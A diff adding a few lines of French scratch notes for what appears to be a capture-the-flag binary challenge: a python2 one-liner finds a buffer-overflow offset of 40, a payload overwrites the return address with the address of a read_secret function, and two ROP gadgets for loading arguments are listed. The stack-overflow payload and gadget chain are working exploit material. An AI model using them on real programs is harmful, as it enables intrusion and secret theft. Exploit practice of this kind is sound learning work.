@@ -1,0 +1,11 @@
+python2 -c 'print "A"*40+"B"*4'
+Donc on a l'offset 40
+00000000004014bd read_secret
+
+python2 -c 'print "A"*40+"\xbd\x14\x40"'
+
+probleme il faut les arguments
+
+0x00000000004017db : pop rdi ; ret
+0x00000000004017dd : pop rsi ; ret
+
